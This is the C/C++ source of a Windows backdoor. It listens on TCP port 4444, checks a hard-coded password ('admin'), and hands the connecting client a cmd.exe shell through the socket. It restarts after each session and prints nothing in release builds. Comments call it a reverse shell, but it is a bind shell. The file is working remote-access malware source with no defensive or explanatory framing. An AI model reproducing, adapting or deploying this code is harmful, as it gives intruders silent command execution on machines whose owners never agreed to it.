// using pure C libs for minimal size
// no <iostream>, etc... because it's bloat
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <ws2tcpip.h>
#include <windows.h>

#ifdef DEBUG
#	define D(x) x   // print
#else // RELEASE
#	define D(x)     // don't print anything
#	define PASSWORD // ask for password
#endif

// obtained from the netcat source code
#define BIGSIZ    8192 // big buffers
#define SMALLSIZ  256  // small buffers, hostnames, etc
#define SIGNALSIZ 16   // for enter/confirmation

#define PORT_SHELL 4444 // reverse shell port

const char* password = "admin";
bool running = true;

int ssend(SOCKET& socket, const char* text, bool print = false) {
	if (print) { D(printf(text)); };
	int ret = send(socket, text, strlen(text), 0);
	if (ret == SOCKET_ERROR) { D(fprintf(stderr, "[-] send error: %i\n", WSAGetLastError())); }
	return ret;
}

int main() {
	
	// initialize winsock
	WSADATA wsData;
	if (WSAStartup(MAKEWORD(2, 2), &wsData) != 0) { D(fprintf(stderr, "[-] unabel to initialize winsock\n")); return 1; }
	else                                          { D(printf("[+] initialized winsock\n")); }
	
	// set CWD for restart
	const char* cwd = getcwd(NULL, 0);
	
	while (running) {
		
		// RESET CWD
		chdir(cwd);
		D(printf("[>] CD = %s\n", getcwd(NULL, 0)));
		
		// create socket
		SOCKET listening = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
		if (listening == INVALID_SOCKET) { D(fprintf(stderr, "[-] PORT[%d] unabel to create socket\n", PORT_SHELL)); return INVALID_SOCKET; }
		else                             { D(printf("[+] PORT[%d] created socket\n", PORT_SHELL));                                          }
		
		// bind socket to ip:port
		sockaddr_in hint;
		hint.sin_family = AF_INET;
		hint.sin_port = htons(PORT_SHELL);
		hint.sin_addr.S_un.S_addr = INADDR_ANY; // could also use inet_pton
		bind(listening, (sockaddr*)&hint, sizeof(hint));
		listen(listening, SOMAXCONN); // tell winsock the socket is for listening
		
		// wait for a connection
		sockaddr_in client;
		int clientSize = sizeof(client);
		D(printf("[*] PORT[%d] listening for a connection...\n", PORT_SHELL));
		SOCKET clientSocket = accept(listening, (sockaddr*)&client, &clientSize); // wait for connection
		if (clientSocket == INVALID_SOCKET) { D(fprintf(stderr, "[-] PORT[%d] unabel to start listening\n", PORT_SHELL)); return INVALID_SOCKET; }
		
		D(
			// get/print client info
			char* ClientIP = inet_ntoa(client.sin_addr);
			int ClientPort = ntohs(client.sin_port);
			printf("[+] PORT[%d] client connected: %s:%d\n", PORT_SHELL, ClientIP, ClientPort)
		);
		
		// close the listening socket
		closesocket(listening);
		
		#ifdef PASSWORD
		
		ssend(clientSocket, "[?] password: ");
		D(printf("[?] asking for password (password is \"%s\")\n", password));
		
		// recv password
		char passBuf[SMALLSIZ];
		ZeroMemory(passBuf, SMALLSIZ);
		/*int bytesReceived =*/ recv(clientSocket, passBuf, SMALLSIZ - 1, 0);
		passBuf[strlen(passBuf)-1] = '\0'; // remove newline
		
		// password check
		if (!strcmp(passBuf, password)) {
			D(printf("[+] user authentication successful\n"));
		} else {
			D(printf("[-] user authentication failed (client entered: %s)\n", passBuf));
			D(printf("[-] restarting...\n"));
			ssend(clientSocket, "[-] wrong password entered.\n");
			closesocket(clientSocket);
			continue;
		}
		#endif
		
		D(printf("[+] reverse shell started\n"));
		
		char Process[] = "cmd.exe";
		STARTUPINFO sinfo;
		memset(&sinfo, 0, sizeof(sinfo));
		sinfo.cb = sizeof(sinfo);
		sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
		sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)clientSocket;
		PROCESS_INFORMATION pinfo;
		CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
		WaitForSingleObject(pinfo.hProcess, INFINITE);
		CloseHandle(pinfo.hProcess);
		CloseHandle(pinfo.hThread);
		
		// stop shell?
		char RecvData[8];
		memset(RecvData, 0, sizeof(RecvData));
		char msg[] = "Stop shell? [y/N]: ";
		if (send(clientSocket, msg, strlen(msg), 0) == SOCKET_ERROR) { closesocket(clientSocket); continue; }
		if (recv(clientSocket, RecvData, 8-1, 0) <= 0) { closesocket(clientSocket); continue; }
		if (strcmp(RecvData, "y\n") == 0) { return 0; }
		
		// close socket
		D(printf("[*] PORT[%d] closing socket...\n", PORT_SHELL));
		closesocket(clientSocket);
		D(printf("[*] PORT[%d] closed socket\n", PORT_SHELL));
	}
	
	// cleanup winsock
	D(printf("[*] cleaning up winsock...\n"));
	WSACleanup();
	D(printf("[*] quitting...\n"));
	
	return 0;
}
